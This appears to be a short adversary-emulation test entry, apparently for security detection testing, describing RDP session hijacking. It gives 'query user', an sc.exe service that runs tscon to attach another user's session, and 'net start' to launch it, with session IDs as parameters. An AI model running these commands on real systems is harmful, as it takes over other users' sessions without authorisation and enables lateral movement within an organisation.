name: RDP hijacking
description: [RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization

data.command:
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
net start sesshijack

input_arguments.name: Destination_ID
input_arguments.description: Connect the session of another user to a different session

input_arguments.name: Session_ID
input_arguments.description: The ID of the session to which you want to connect
